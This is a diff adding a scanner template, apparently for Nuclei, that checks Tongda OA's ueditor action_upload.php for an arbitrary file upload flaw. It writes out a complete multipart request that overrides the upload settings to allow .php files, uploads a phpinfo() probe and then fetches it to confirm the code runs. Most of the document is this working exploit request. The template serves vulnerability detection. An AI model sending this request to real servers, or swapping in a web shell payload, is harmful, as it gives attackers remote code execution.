@@ -1,0 +1,73 @@
+id: tongda-oa-action-upload-getshell
+info:
+  name: Tongda OA action_upload.php File Upload Getshell
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template identifies a file upload vulnerability in Tongda OA's action_upload.php, which can be exploited to achieve remote code execution.
+  tags: getshell, file-upload, rce
+  reference:
+    - http://fofa.so
+
+variables:
+  random_filename: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
+
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+        ff
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+        1000000000
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+        {{random_filename}}
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+        .php
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="ff"; filename="test.php"
+        Content-Type: application/octet-stream
+
+        <?php phpinfo();?>
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="mufile"
+
+        submit
+        -----------------------------55719851240137822763221368724--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "phpinfo"
+        part: body
+
+  - raw:
+      - |
+        GET /{{random_filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
